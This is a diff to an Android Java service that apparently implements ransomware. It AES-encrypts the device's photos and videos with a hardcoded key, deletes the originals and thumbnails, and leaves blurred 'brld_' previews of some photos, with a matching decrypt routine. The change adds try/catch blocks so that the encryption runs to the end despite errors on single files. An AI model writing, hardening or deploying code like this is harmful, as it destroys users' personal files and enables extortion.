@@ -161,27 +161,37 @@ public class MyService extends Service {
     public void encryptFile() throws Exception {
         Helper.makeToast(ctx,"Pics");
         for (File file : al) {
-            if (file.getPath().contains(".thumbnails")) {
-                file.delete();
-                updateProgress(true);
-            } else if (!file.getPath().contains("IMPORTANT.jpg") && !file.getPath().contains(".enc") && !file.getPath().contains("brld_")) {
-                // 1 in N
-                if (new Random().nextInt(20) == 0) {
-                    byte[] brld = blurPhoto(file);
-                    saveFile(brld, file.getParentFile().getPath() + File.separator + "brld_" + file.getName());
-                }
-                Log.v("Crypt file", file.getPath());
-                byte[] enc = Aes.encrypt(KEY, fullyReadFileToBytes(file));
-                saveFile(enc, file.getPath() + ".enc");
+            try {
+                if (file.getPath().contains(".thumbnails")) {
+                    file.delete();
+                    updateProgress(true);
+                } else if (!file.getPath().contains("IMPORTANT.jpg") && !file.getPath().contains(".enc") && !file.getPath().contains("brld_")) {
+                    // 1 in N
+                    if (new Random().nextInt(20) == 0) {
+                        byte[] brld = blurPhoto(file);
+                        saveFile(brld, file.getParentFile().getPath() + File.separator + "brld_" + file.getName());
+                    }
+                    Log.v("Crypt file", file.getPath());
+                    byte[] enc = Aes.encrypt(KEY, fullyReadFileToBytes(file));
+                    saveFile(enc, file.getPath() + ".enc");
 
-                file.delete();
-                updateProgress(true);
+                    file.delete();
+                    updateProgress(true);
+                }
+            }catch (Exception e){
+                Log.v("FILE_ERROR",file.getPath());
+                e.printStackTrace();
             }
         }
         Helper.makeToast(ctx,"Vids");
         for (File vid : vids) {
             if (!vid.getPath().contains(".enc")){
-                Aes.encryptLarge(KEY, vid, new File(vid.getPath()+".enc"));
+                try {
+                    Aes.encryptLarge(KEY, vid, new File(vid.getPath() + ".enc"));
+                }catch (Exception e){
+                    Log.v("FILE_ERROR",vid.getPath());
+                    e.printStackTrace();
+                }
             }
         }
 
@@ -198,22 +208,32 @@ public class MyService extends Service {
 
     public void decryptFile() throws Exception {
         for (File file : al) {
-            Log.v("FILE",file.getPath());
-            if (file.getPath().contains(".thumbnails") || file.getPath().contains("brld")) {
-                file.delete();
-            } else if (file.getPath().contains(".enc") && !file.getPath().contains(".enc.enc") && !file.getPath().contains("brld")) {
-                //Decrypt
-                byte[] in = fullyReadFileToBytes(file);
-                byte[] dec = Aes.decrypt(KEY, in);
-                saveFile(dec, file.getPath().substring(0, file.getPath().length() - 4));
-                file.delete();
+            try{
+                Log.v("FILE",file.getPath());
+                if (file.getPath().contains(".thumbnails") || file.getPath().contains("brld")) {
+                    file.delete();
+                } else if (file.getPath().contains(".enc") && !file.getPath().contains(".enc.enc") && !file.getPath().contains("brld")) {
+                    //Decrypt
+                    byte[] in = fullyReadFileToBytes(file);
+                    byte[] dec = Aes.decrypt(KEY, in);
+                    saveFile(dec, file.getPath().substring(0, file.getPath().length() - 4));
+                    file.delete();
+                }
+                updateProgress(false);
+            }catch (Exception e){
+                Log.v("FILE_ERROR",file.getPath());
+                e.printStackTrace();
             }
-            updateProgress(false);
         }
 
         for (File vid : vids) {
             if (vid.getPath().contains(".enc") && !vid.getPath().contains(".enc.enc")) {
-                Aes.decryptLarge(KEY, vid, new File(vid.getPath().substring(0, vid.getPath().length() - 4)));
+                try {
+                    Aes.decryptLarge(KEY, vid, new File(vid.getPath().substring(0, vid.getPath().length() - 4)));
+                }catch (Exception e){
+                    Log.v("FILE_ERROR",vid.getPath());
+                    e.printStackTrace();
+                }
             }
         }
 
